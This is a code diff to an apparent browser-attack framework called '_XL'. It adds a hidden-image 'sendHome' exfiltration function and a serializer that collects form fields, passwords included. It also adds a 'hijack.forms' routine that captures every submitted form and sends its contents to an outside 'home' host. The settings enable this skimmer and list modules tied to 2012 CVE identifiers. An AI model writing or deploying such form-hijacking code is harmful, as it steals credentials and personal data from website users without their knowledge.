@@ -2,8 +2,8 @@ var _XL = {
     // Stored data to be sent 'home'
     'data': {},
     
-    // Will attempt to find a property from a
-    //  period-delimited string
+    // Will attempt to find an object property
+    //  from a period delimited string
     // Ex: find('util.serializeObj', _XL);
     // returns the _XL.util.serializeObj function
     'find': function (needle, haystack) {
@@ -62,6 +62,16 @@ var _XL = {
 };
 
 _XL.util = {
+    // Attempts to send data argument home
+    'sendHome': function (data) {
+        var img_el = document.createElement("img");
+        img_el.style.display = "none";
+        var src = _XL.settings.home + '?' + data;
+        img_el.setAttribute("src",src);
+        
+        document.documentElement.appendChild(img_el);        
+    },
+    
     // Convert javascript object to POST-able data
     'serializeObj': function (obj) {
         var str = [];
@@ -69,6 +79,37 @@ _XL.util = {
             str.push(p + "=" + obj[p]);
         }
         return str.join("&");
+    },
+    // Serialize form inputs
+    'serializeForm': function (form) {
+        var valid_els = [];
+        var values = {};
+        var rselectTextarea = /select|textarea/i;
+        var rinput = /color|date|datetime|email|hidden|month|number|password|range|search|tel|text|time|url|week/i;
+    
+        console.log(form);
+        for (var i=0; i<form.children.length; i++) {
+            var form_el = form.children[i];
+            if (form_el.name && !form_el.disabled &&
+                (form_el.checked || rselectTextarea.test( form_el.nodeName ) || rinput.test( form_el.type ))) {
+                    valid_els.push(form_el);
+            }
+        }
+        for (i=0; i<valid_els.length; i++) {
+            var val;
+            var el = valid_els[i]
+            var elName = valid_els[i].nodeName.toLowerCase();
+            if (elName === "select") {
+                val = el.selectedIndex;
+            }
+            else {
+                if (el.value) {
+                    val = el.value
+                }
+            }
+            values[el.name] = val;
+        }
+        return this.serializeObj(values);
     }
 };
 
@@ -93,6 +134,14 @@ _XL.controls.page = {
                 this.style.height = "100%";
             }
             document.documentElement.appendChild(iframe);           
+        },
+        'hijack' : {
+            'forms' : function () {
+                window.addEventListener("submit", function (evt) {
+                    var data = _XL.util.serializeForm(evt.target);
+                    _XL.util.sendHome(data);
+                }, false)
+            }
         }
 };
 
@@ -198,12 +247,14 @@ _XL.exploits.CVE_2012_0053 = {
 };
 
 _XL.settings = {
+    'home': "http://test.apbdb.com/test",
     'modules': [
         'exploits.CVE_2012_0830'
         //'exploits.CVE_2012_0053'
     ],
     'script': [
-        ['controls.page.overlay', 'http://www.apbdb.com']
+        //['controls.page.overlay', 'http://www.apbdb.com']
+        ['controls.page.hijack.forms', 'http://www.apbdb.com']
     ]
 };
 
